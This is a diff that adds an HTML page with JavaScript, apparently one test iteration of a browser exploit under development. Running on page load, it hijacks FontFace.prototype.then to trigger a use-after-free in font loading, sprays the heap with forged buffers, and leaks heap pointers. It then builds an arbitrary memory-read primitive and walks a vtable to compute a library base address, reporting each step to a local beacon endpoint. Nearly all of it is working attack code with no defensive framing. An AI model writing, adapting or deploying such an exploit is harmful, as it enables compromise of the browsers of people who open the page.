@@ -1,0 +1,257 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>T7a</title></head>
+<body><pre id="O">T7a</pre>
+<script>
+'use strict';
+function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T7a-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
+bs('BOOT');
+var K=512,SZ=192,fired=false,faces=null,AT=0;
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function hex(x){return '0x'+x.toString(16);}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
+
+function start(){
+  AT++;if(AT>1)return;
+  try{if(sessionStorage.getItem('uaf')){bs('DOUBLE');return;}sessionStorage.setItem('uaf','1');}catch(e){}
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SZ));
+      put32(w,0,0x80000000);put32(w,4,0x1000+k);
+      w[0x82]=3;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,80);},function(){});
+}
+
+function phase(){
+  var bufs=[],L1=0n,L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58);
+    if(a>0x1000000000n){
+      var b2=le(window.__sp[i],0x68);
+      if(L1===0n){L1=a;L2=b2;}
+      bufs.push([window.__sp[i],b2,i]);
+    }
+  }
+  bs('L1='+hex(L1)+'-L2='+hex(L2)+'-bufs='+bufs.length);
+  if(!bufs.length){bs('NOLEAK');return;}
+  var h0=bufs[0][0];
+
+  for(var ib=0;ib<bufs.length;ib++){
+    var vb=bufs[ib][0];
+    vb[0]=2;put64(vb,0x08,bufs[ib][1]);put64(vb,0x10,0n);vb[0x82]=0;
+  }
+  setTimeout(function(){
+    bs('FACES='+faces.length);
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+    for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=0;bufs[is2][0][0x2C]=0;}
+    setTimeout(function(){
+      var fam=null,zi=-1;
+      for(var q=0;q<faces.length;q++){
+        var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){r='EX';}
+        if(r===false&&zi<0){fam='zz'+q;zi=q;}
+      }
+      bs('FAM='+fam+'-zi='+zi);
+      if(!fam){bs('NOTIN');return;}
+
+      h0[0x82]=0;put64(h0,0x20,L1);
+      put32(h0,0x28,1);put32(h0,0x2C,1);
+      put32(h0,0x38,0xBEEF);put32(h0,0x3C,0xBF00);
+
+      function setR(addr){put64(h0,0x20,addr);}
+      function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c));}catch(e){return 'EX';}}
+
+      bs('SCAN1');
+      var self=0n;
+      for(var sc=0x1000800000n;sc<0x1002800000n&&!self;sc+=0x80n){
+        setR(sc+0x38n);
+        if(chk(0xBEEF)!==true)continue;
+        if(chk(0xBEEE)!==false)continue;
+        setR(sc+0x6Cn);
+        if(chk(0)===false){self=sc;bs('SELF='+hex(sc));}
+      }
+      if(!self){bs('NOSELF');return;}
+
+      function dec(s,lim){
+        var by=[],q3=(s.charAt(0)==='"')?1:0,e2=(s.slice(-1)==='"')?s.length-1:s.length,k2=q3;
+        while(k2<e2&&by.length<lim){var ch=s.charAt(k2);
+          if(ch==='\\'){k2++;var hh='';while(k2<e2&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k2))){hh+=s.charAt(k2);k2++;}
+            if(hh.length===0){if(k2<e2){by.push(s.charCodeAt(k2));k2++;}}
+            else{if(s.charAt(k2)===' ')k2++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+          else{by.push(s.charCodeAt(k2));k2++;}}
+        var hx='';for(var j=0;j<by.length;j++)hx+=('0'+by[j].toString(16)).slice(-2);return hx;
+      }
+      function readLeHex(hs,off){
+        var sl=hs.slice(off*2,off*2+16);
+        if(!/^[0-9a-f]{16}$/.test(sl))return 0n;
+        return BigInt('0x'+sl.match(/../g).reverse().join(''));
+      }
+
+      var snap=new Uint8Array(SZ);
+      for(var s0=0;s0<SZ;s0++)snap[s0]=h0[s0];
+
+      function restore(){
+        for(var ri=0;ri<window.__sp.length;ri++){
+          var rv=window.__sp[ri];if(!rv)continue;
+          for(var d=0;d<SZ;d++)rv[d]=snap[d];
+        }
+      }
+      function forgeRead(daddr,dlen){
+        for(var fi=0;fi<window.__sp.length;fi++){
+          var fv=window.__sp[fi];if(!fv)continue;
+          put64(fv,0x08,self+0x70n);fv[0x10]=0;
+          put32(fv,0x30,4);put32(fv,0x34,dlen);
+          put64(fv,0x38,daddr);put32(fv,0x40,4);
+          fv[0x44]=0x7A;fv[0x45]=0x7A;fv[0x46]=0x71;
+          put32(fv,0x70,4);put32(fv,0x74,0x10);
+          fv[0x78]=14;fv[0x79]=0;
+          put64(fv,0x7A,self+0x90n);
+          put32(fv,0x90,3);put32(fv,0x94,72);
+          put64(fv,0x98,self+0x30n);
+        }
+      }
+
+      // ============================================================
+      // TEST A: Standard forge, then DELETE + RE-ADD, then read style
+      // Hypothesis: re-add re-populates the descriptor cache from
+      // the forged CSSFontFace, giving us binary data
+      // ============================================================
+      bs('TEST-A');
+      forgeRead(L1-0x10n,80);
+
+      // baseline: read BEFORE re-add (expect "normal" from cache)
+      var preRA='';
+      try{preRA=String(faces[zi].style);}catch(e){preRA='THROW';}
+      bs('A-PRE='+preRA);
+
+      // delete + re-add
+      try{document.fonts.delete(faces[zi]);}catch(e){bs('A-DELERR');}
+      try{document.fonts.add(faces[zi]);}catch(e){bs('A-ADDERR');}
+
+      var postRA='';
+      try{postRA=dec(String(faces[zi].style),128);}catch(e){postRA='THROW';}
+      bs('A-POST-len='+postRA.length+'-d='+postRA.slice(0,60));
+
+      // also read status after re-add
+      var stRA='';try{stRA=faces[zi].status;}catch(e){stRA='THROW';}
+      bs('A-STATUS='+stRA);
+
+      // ============================================================
+      // TEST B: Restore, forge, delete + re-add ALL faces, read both
+      // ============================================================
+      bs('TEST-B');
+      restore();
+      forgeRead(L1-0x10n,80);
+
+      for(var db=0;db<faces.length;db++){
+        try{document.fonts.delete(faces[db]);}catch(e){}
+      }
+      for(var ab=0;ab<faces.length;ab++){
+        try{document.fonts.add(faces[ab]);}catch(e){}
+      }
+      for(var rb=0;rb<faces.length;rb++){
+        var vb2='';
+        try{vb2=dec(String(faces[rb].style),128);}catch(e){vb2='THROW';}
+        bs('B-f'+rb+'-len='+vb2.length+'-d='+vb2.slice(0,60));
+      }
+
+      // ============================================================
+      // TEST C: Restore, forge, set style='', then delete+re-add
+      // Hypothesis: setter clears cache, re-add repopulates from forged
+      // ============================================================
+      bs('TEST-C');
+      restore();
+      forgeRead(L1-0x10n,80);
+
+      try{faces[zi].style='';}catch(e){bs('C-SETERR');}
+      try{document.fonts.delete(faces[zi]);}catch(e){}
+      try{document.fonts.add(faces[zi]);}catch(e){}
+
+      var postRC='';
+      try{postRC=dec(String(faces[zi].style),128);}catch(e){postRC='THROW';}
+      bs('C-POST-len='+postRC.length+'-d='+postRC.slice(0,60));
+
+      // ============================================================
+      // TEST D: Restore, delete+re-add FIRST (populate cache), then
+      // forge, then read — tests if getter is live or cached
+      // ============================================================
+      bs('TEST-D');
+      restore();
+      try{document.fonts.delete(faces[zi]);}catch(e){}
+      try{document.fonts.add(faces[zi]);}catch(e){}
+      forgeRead(L1-0x10n,80);
+
+      var postRD='';
+      try{postRD=dec(String(faces[zi].style),128);}catch(e){postRD='THROW';}
+      bs('D-POST-len='+postRD.length+'-d='+postRD.slice(0,60));
+
+      // ============================================================
+      // If any test returned >20 hex chars, do the full walk
+      // ============================================================
+      var winner=-1,winHex='';
+      var tests=[
+        {n:'A',d:postRA},{n:'B0',d:''},{n:'C',d:postRC},{n:'D',d:postRD}
+      ];
+      for(var ti=0;ti<tests.length;ti++){
+        if(tests[ti].d.length>20&&winner<0){winner=ti;winHex=tests[ti].d;}
+      }
+      bs('WINNER='+winner);
+
+      if(winHex.length>=80){
+        bs('WALK-START');
+        var IM=0n;
+        for(var gb=0;gb<10;gb++){
+          var cv=readLeHex(winHex,gb*8);
+          if(cv>0x1000000000n&&cv<0xFFFFFFFFFFFFFFFFn){IM=cv;break;}
+        }
+        bs('IM='+hex(IM));
+        if(IM>0x1000000000n){
+          restore();forgeRead(IM+8n,16);
+          try{document.fonts.delete(faces[zi]);}catch(e){}
+          try{document.fonts.add(faces[zi]);}catch(e){}
+          var h2='';try{h2=dec(String(faces[zi].style),128);}catch(e){h2='THROW';}
+          var FO=(h2.length>=16)?readLeHex(h2,0):0n;
+          bs('FO='+hex(FO));
+          if(FO>0x1000000000n){
+            restore();forgeRead(FO,32);
+            try{document.fonts.delete(faces[zi]);}catch(e){}
+            try{document.fonts.add(faces[zi]);}catch(e){}
+            var h3='';try{h3=dec(String(faces[zi].style),128);}catch(e){h3='THROW';}
+            var VP=(h3.length>=16)?readLeHex(h3,0):0n;
+            bs('VP='+hex(VP));
+            if(VP>0x100000000n){
+              restore();forgeRead(VP,128);
+              try{document.fonts.delete(faces[zi]);}catch(e){}
+              try{document.fonts.add(faces[zi]);}catch(e){}
+              var h4='';try{h4=dec(String(faces[zi].style),128);}catch(e){h4='THROW';}
+              bs('VT-d='+h4.slice(0,144));
+              var BASE=VP-0xC6A1B28n;
+              bs('BASE='+hex(BASE));
+              for(var si=0;si<8;si++){bs('VT-s'+si+'='+hex(readLeHex(h4,si*8)));}
+            }
+          }
+        }
+      }
+
+      restore();
+      bs('DONE-winner='+winner);
+      document.getElementById('O').textContent='T7a winner='+winner;
+    },500);
+  },80);
+}
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',start);
+</script></body></html>
